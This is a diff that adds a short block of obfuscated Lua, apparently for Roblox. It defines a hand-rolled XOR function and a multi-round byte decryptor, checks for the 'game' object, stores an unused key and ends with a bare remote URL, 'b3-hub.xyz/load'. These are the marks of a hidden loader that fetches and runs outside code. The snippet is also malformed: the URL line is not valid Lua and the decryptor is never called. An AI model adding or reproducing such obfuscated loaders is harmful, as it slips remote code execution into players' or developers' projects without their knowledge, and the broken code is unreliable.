@@ -1,0 +1,9 @@
+do
+local _v2024381f382ex=function(a,b)local r=0 local m=1 while a>0 or b>0 do local x=a%2 local y=b%2 if x~=y then r=r+m end a=(a-x)/2 b=(b-y)/2 m=m*2 end return r end
+local _v2024381f382ed=function(b,k,s,t,n)local o={} for i=1,#b do local v=b[i] for r=n,1,-1 do local rk=(_v2024381f382ex((s+r*17+(i-1)*13+t)%256,r*29) % 256) v=(_v2024381f382ex(v%256,rk)-s-(i-1)*t-r)%256 end o[#o+1]=string.char((_v2024381f382ex(v%256,k))%256) end return table.concat(o) end
+local _v2024381f382en=function(a,b)return a-b end
+local _v2024381f382eg=pcall(function() local t=type(game) if t~='userdata' and t~='table' then error('x') end return true end)
+if not _v2024381f382eg then return end
+local _v2024381f382ej=419913
+https://b3-hub.xyz/load
+end
